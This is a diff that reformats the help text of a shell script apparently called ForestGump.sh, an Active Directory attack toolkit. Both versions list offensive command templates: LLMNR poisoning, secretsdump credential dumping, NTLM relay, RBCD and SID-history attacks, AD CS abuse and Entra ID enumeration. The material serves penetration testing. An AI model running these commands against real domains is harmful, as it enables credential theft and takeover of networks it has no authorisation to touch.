@@ -16,65 +16,49 @@ alias entrafalcon='pwsh /opt/tools/EntraFalcon/EntraFalcon.ps1'
 
 help() {
   cat <<'EOF'
-╔══════════════════════════════════════════════════════════╗
-║           ForestGump.sh - AD Attack Platform            ║
-╚══════════════════════════════════════════════════════════╝
+  +----------------------------------------------------+
+  |         ForestGump.sh - AD Attack Platform         |
+  +----------------------------------------------------+
 
-──  RECONNAISSANCE  ──────────────────────────────────────
-  bloodhound-python  -c LDAP -u USER -p PASS -d DOMAIN -ns TARGET
-                    BloodHound data collector (ingestor)
-  ldapdomaindump     LDAP://TARGET -u DOMAIN\\USER -p PASS
-                    Dump AD objects via LDAP
-  adreaper            -u USER -p PASS -d DOMAIN -dc-ip TARGET
-                    Multi-protocol AD enumeration
-  nxc ldap TARGET -u USER -p PASS --users
-                    NetExec LDAP enumeration
+  [ RECONNAISSANCE ]
+    bloodhound-python -c LDAP -u USER -p PASS -d DOMAIN -ns TARGET
+    adreaper -u USER -p PASS -d DOMAIN -dc-ip TARGET
+    nxc ldap TARGET -u USER -p PASS --users
+    ldapdomaindump LDAP://TARGET -u DOMAIN\\USER -p PASS
 
-──  AUTHENTICATION ATTACKS  ──────────────────────────────
-  Responder -I eth0 -w
-                    LLMNR/NBT-NS/mDNS poisoning
-  coercer list TARGET -u USER -p PASS -d DOMAIN
-                    Auto coercion of Windows auth
-  impacket-getTGT DOMAIN/USER:PASS@TARGET
-                    Request TGT (then use with KRB5CCNAME)
+  [ AUTHENTICATION ATTACKS ]
+    Responder -I eth0 -w
+    coercer list TARGET -u USER -p PASS -d DOMAIN
+    impacket-getTGT DOMAIN/USER:PASS@TARGET
 
-──  PRIVILEGE ESCALATION  ────────────────────────────────
-  bloodyAD --host TARGET -d DOMAIN -u USER -p PASS
-                    AD privilege escalation
-  impacket-secretsdump DOMAIN/USER:PASS@TARGET
-                    Dump domain secrets
-  certipy-ad find -u USER@DOMAIN -p PASS -dc-ip TARGET
-                    AD CS abuse
-  impacket-rbcd -action write -delegate-from DELEGATE -delegate-to TARGET DOMAIN/USER:PASS
-                    RBCD attack
-  pysidhistory TARGET DOMAIN USER:PASS
-                    SID history injection
+  [ PRIVILEGE ESCALATION ]
+    bloodyAD --host TARGET -d DOMAIN -u USER -p PASS
+    impacket-secretsdump DOMAIN/USER:PASS@TARGET
+    certipy-ad find -u USER@DOMAIN -p PASS -dc-ip TARGET
+    impacket-rbcd -action write -delegate-from A -delegate-to B DOMAIN/U:P
+    pysidhistory TARGET DOMAIN USER:PASS
 
-──  RELAY & PROXY  ───────────────────────────────────────
-  relayking          NTLM/Kerberos relay detection tool
-  impacket-ntlmrelayx -tf targets.txt -smb2support
-                    NTLM relay
+  [ RELAY & PROXY ]
+    relayking
+    impacket-ntlmrelayx -tf targets.txt -smb2support
 
-──  CLOUD (AZURE/ENTRA ID)  ─────────────────────────────
-  roadrecon auth -u USER@DOMAIN -p PASS
-                    Azure AD authentication
-  roadrecon gather   Enumerate Azure AD
-  ca-insight         Conditional Access policy analysis
-  entrafalcon        Entra ID enumeration (PowerShell)
+  [ CLOUD (AZURE/ENTRA ID) ]
+    roadrecon auth -u USER@DOMAIN -p PASS
+    ca-insight
+    entrafalcon
 
-──  UTILITY  ─────────────────────────────────────────────
-  gopacket-*         Go-based impacket (63 tools, tab-complete)
-  impacket-*         Python impacket suite
-  nxc                NetExec (multi-protocol)
-  getspnless SPN TARGET
-                    SPN-less RBCD attack
+  [ UTILITY ]
+    gopacket-*    tab-complete for all 63 Go tools
+    impacket-*    full Python impacket suite
+    nxc           NetExec
+    getspnless SPN TARGET
 
-──  QUICK START  ─────────────────────────────────────────
-  1. nxc ldap TARGET -u USER -p PASS --users     # recon users
-  2. bloodhound-python -c LDAP -u USER -p PASS -d DOMAIN -ns TARGET
-  3. impacket-secretsdump DOMAIN/USER:PASS@TARGET
-  4. certipy-ad find -u USER@DOMAIN -p PASS -dc-ip TARGET
+  [ QUICK START ]
+    nxc ldap TARGET -u USER -p PASS --users
+    bloodhound-python -c LDAP -u USER -p PASS -d DOMAIN -ns TARGET
+    impacket-secretsdump DOMAIN/USER:PASS@TARGET
+    certipy-ad find -u USER@DOMAIN -p PASS -dc-ip TARGET
 
-Run any tool with --help / -h for its specific flags.
+  Run any tool with --help / -h for its specific flags.
 EOF
 }
